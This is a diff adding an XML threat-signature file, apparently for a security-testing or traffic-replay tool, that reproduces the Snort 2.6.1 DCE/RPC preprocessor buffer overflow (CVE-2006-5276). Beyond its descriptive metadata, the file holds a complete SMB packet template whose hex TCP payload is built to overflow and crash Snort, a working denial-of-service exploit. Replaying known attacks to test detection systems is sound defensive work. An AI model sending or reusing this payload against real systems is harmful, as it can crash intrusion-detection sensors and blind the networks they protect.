@@ -1,0 +1,79 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Snort DCE/RPC Preprocessor Remote Buffer Overflow"/>
+    <EngDesc display="true" value="This threat sends out a SMB packet constructed in such a way that it will cause a buffer overflow and crash Snort 2.6.1."/>
+    <Intent display="true">
+      <item value="Crashing"/>
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="SMB"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Snort"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Snort"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="2.6.1"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.milw0rm.com/exploits/3362"/>
+    <CVEID display="true" value="2006-5276"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="32064"/>
+    <Author display="true" value="Seth Hardy"/>
+    <ID display="true" value="d734d571eed9b8754f0fbbb9d9f7647d"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="false"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="availability"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633078351735654544"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1172256524" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="SMBdestPort" type="ImperfectControls.Port" value="null" index="H"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="H"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1025,65535)" destPort="$SMBdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="000001A6FF534D4275000000001807C80000000000000000000000000000FFFE0008300004A2005200080001002700005C005C0049004E0053002D004B004900520041005C00490050004300240000003F3F3F3F3F00182F009600000E0016000000000000009F01020000000000000000000000000003000000010000004000400002000000011100005C0073007200760073007600630000000E2F00FE00004000000000FFFFFFFF8000480000004800B600000000004900EE05000B0310000000FF01000001000000B810B810000000000100000000000100C84F324B7016D30112785A47BF6EE18803000000045D888AEB1CC9119FE808002B104860020000000EFF00DEDE004000000000FFFFFFFF800048000000FF013001000000004900EE05000B03100000004800000001000000B810B810000000000100000000000100C84F324B7016D30112785A47BF6EE18803000000045D888AEB1CC9119FE808002B104860020000000A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
